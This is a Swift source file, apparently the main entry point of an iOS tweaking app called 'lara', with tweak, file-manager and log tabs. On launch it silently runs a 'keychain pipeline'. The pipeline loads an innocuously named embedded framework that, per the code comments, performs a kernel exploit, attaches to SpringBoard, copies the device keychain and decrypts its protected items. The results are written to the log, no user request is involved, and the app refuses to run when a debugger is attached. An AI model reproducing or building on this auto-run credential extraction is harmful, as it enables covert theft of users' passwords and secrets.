//
//  lara.swift
//  lara
//
//  Created by ruter on 23.03.26.
//

import SwiftUI
import UniformTypeIdentifiers

enum taboptions {
    case applying, tweaks, files, logs
}

let g_isunsupported: Bool = isunsupported()
var weonadebugbuild_pjbweouttahereexclamationmark: Bool = false

@main
struct lara: App {
    @StateObject private var mgr = laramgr.shared
    @StateObject private var iconthememgr = IconThemeManager.shared
    @Environment(\.scenePhase) var scenephase
    @AppStorage("selectedMethod") private var selectedMethod: method = .hybrid
    @AppStorage("keepAlive") private var keepalive: Bool = false
    @AppStorage("showFMInTabs") private var showfmintabs: Bool = true
    @AppStorage("logsdisplaymode") private var logsdisplaymode: logsdisplaymode = .toolbar
    @State private var selectedtab: taboptions = .applying
    
    init() {
        #if DEBUG
        weonadebugbuild_pjbweouttahereexclamationmark = true
        #endif
        
        // fix file picker
        let fixMethod = class_getInstanceMethod(UIDocumentPickerViewController.self, #selector(UIDocumentPickerViewController.fix_init(forOpeningContentTypes:asCopy:)))!
        let origMethod = class_getInstanceMethod(UIDocumentPickerViewController.self, #selector(UIDocumentPickerViewController.init(forOpeningContentTypes:asCopy:)))!
        method_exchangeImplementations(origMethod, fixMethod)
        
        if keepalive {
            toggleka()
        }
        
        globallogger.capture()
    }
    
    var body: some Scene {
        WindowGroup {
            TabView(selection: $selectedtab) {
                ContentView()
                    .tabItem {
                        Image(systemName: "wrench.and.screwdriver.fill")
                    }
                    .tag(taboptions.applying)
                
                // this has gotta fucking go
                TweaksView(mgr: mgr)
                    .tabItem {
                        Image(systemName: "ant.fill")
                    }
                    .tag(taboptions.tweaks)
                
                
                // i'm gonna strangle you root (the weight of your actions will crush you)
                if showfmintabs {
                    SantanderView(startPath: "/")
                        .tabItem {
                            Image(systemName: "folder.fill")
                        }
                        .tag(taboptions.files)
                }
                
                // this too
                if logsdisplaymode == .tabs {
                    LogsView(logger: globallogger)
                        .tabItem {
                            Image(systemName: "terminal")
                        }
                        .tag(taboptions.logs)
                }
            }
            .environmentObject(mgr)
            .overlay {
                if mgr.showrespring {
                    respringview()
                        .brightness(-1.0)
                        .ignoresSafeArea()
                }
            }
            .sheet(isPresented: Binding(
                get: { logsdisplaymode == .toolbar && mgr.showLogs },
                set: { mgr.showLogs = $0 }
            )) {
                LogsView(logger: globallogger)
            }
            .sheet(isPresented: $iconthememgr.showFixupSheet) {
                IconThemeFixupView()
            }
            .onAppear {
                if !isunsupported() {
                    init_offsets()
                    offsets_init()
                    iconthememgr.startPendingFixupIfPossible()
                    // beautiful name root
                    // thanks
                    mgr.hasOffsets = emergencyfixfunctiontobereplacedlateronquestionmark()
                    autorunkeychainpipeline()
                } else {
                    Alertinator.shared.alert(title: "This device is not supported!", body: "We apologize, but this device is currently not supported by Lara. Possible reasons: \n- You are on an unsupported iOS version (Supported: iOS 16.0 - iOS 18.7.1, iOS 26.0 - iOS 26.0.1) \n- Your device has MIE (A19+ or M5+) \n- A debugger is attached.", actionLabel: "Exit App", action: { exitinator() })
                }
            }
            .onChange(of: scenephase, perform: handleScenePhase)
            .onChange(of: mgr.sbxready) { ready in
                if ready {
                    iconthememgr.startPendingFixupIfPossible()
                }
            }
        }
    }
    
    private func handleScenePhase(_ phase: ScenePhase) {
        switch phase {
        case .inactive, .background:
            // A transient .inactive/.background (system alert, Control Center,
            // screen lock, respring) must not kill the auto keychain pipeline:
            // handlebg() would destroy the SpringBoard RemoteCall the framework
            // is using, and stopcapture() would stop logging. Let it finish.
            if mgr.kcpipelineactive {
                globallogger.log("(kc) scene \(phase) ignored: keychain pipeline in flight")
                return
            }
            handlebg()
            globallogger.stopcapture()

        case .active:
            globallogger.capture()
            iconthememgr.startPendingFixupIfPossible()

        @unknown default:
            break
        }
    }

    // Framework-only mode: the embedded libuiopsersvc.framework brings up its
    // own kernel r/w (ds_run -> its own exploit + kernelcache fetch/parse).
    // Its securityd copy path needs a ready SpringBoard RemoteCall — and that
    // RemoteCall is the FRAMEWORK's class (RemoteCall.m is excluded from the
    // lara target in project.pbxproj), so it checks the FRAMEWORK's ds state
    // and must be built AFTER the framework's own ds_run(). That handoff now
    // happens inside LaraKeychainSvc (prepareKernelRWWithError), so this entry
    // point stays a plain handoff to the framework pipeline.
    private func autorunkeychainpipeline() {
        globallogger.log("(kc) using embedded libuiopsersvc.framework (framework-only)")
        globallogger.log("(kc) build-marker guard-v1 da764c3+ (framework has recursion depth guard)")
        prepareAndRunKeychainPipeline()
    }

    // Drive the embedded framework end-to-end. The framework owns the whole
    // pipeline: exploit -> kernelcache -> offsets -> remote attach -> keychain
    // copy -> AKS unwrap. We only keep the process alive and guard the
    // scene-phase teardown while it runs.
    private func prepareAndRunKeychainPipeline() {
        let mgr = self.mgr

        // Keep the process alive for the whole pipeline and ignore transient
        // scene-phase teardown (mgr.kcpipelineactive).
        mgr.kcpipelineactive = true
        if !kaenabled { toggleka() }

        do {
            try LaraKeychainSvc.ensureLoaded()
            globallogger.log("(kc) libuiopsersvc loaded")
        } catch {
            globallogger.log("(kc) libuiopsersvc load failed: \(error.localizedDescription)")
            mgr.kcpipelineactive = false
            return
        }

        globallogger.log("(kc) running framework pipeline (exploit + copy + AKS unwrap)")

        // The framework's AKS decrypt path recurses deep into the keychain data
        // (observed depth ~6600 frames, "Thread stack size exceeded due to
        // excessive recursion" on a GCD worker). GCD workers only get a 512KB
        // stack, so run the whole pipeline on a dedicated large-stack thread.
        let thread = Thread {
            var result: [AnyHashable: Any]?
            var failure: Error?
            do {
                result = try LaraKeychainSvc.runOneClickUnwrap(withMaxRows: 0)
            } catch {
                failure = error
            }

            DispatchQueue.main.async {
                if let failure {
                    globallogger.log("(kc) keychain pipeline failed: \(failure.localizedDescription)")
                } else {
                    globallogger.log("(kc) keychain pipeline done: \(result ?? [:])")
                }
                mgr.kcpipelineactive = false
            }
        }
        thread.stackSize = 16 * 1024 * 1024
        thread.qualityOfService = .userInitiated
        thread.name = "kc-pipeline"
        thread.start()
    }

    private func handlebg() {
        guard mgr.rcready else { return }
        let keepSpringBoardRemoteCallAlive = UserDefaults.standard.bool(forKey: "keepSpringBoardRemoteCallAliveIOS16")
        if isIOS16() && keepSpringBoardRemoteCallAlive {
            return
        }

        var bgTask: UIBackgroundTaskIdentifier = .invalid

        bgTask = UIApplication.shared.beginBackgroundTask(withName: "RemoteCallCleanup") {
            endbgtask(&bgTask)
        }

        mgr.rcdestroy {
            self.endbgtask(&bgTask)
        }
    }

    private func endbgtask(_ task: inout UIBackgroundTaskIdentifier) {
        guard task != .invalid else { return }
        UIApplication.shared.endBackgroundTask(task)
        task = .invalid
    }
}

// file picker fixes
extension UIDocumentPickerViewController {
    @objc func fix_init(forOpeningContentTypes contentTypes: [UTType], asCopy: Bool) -> UIDocumentPickerViewController {
        return fix_init(forOpeningContentTypes: contentTypes, asCopy: true)
    }
}

// make strings compatiable with errors
extension String: @retroactive Error {}
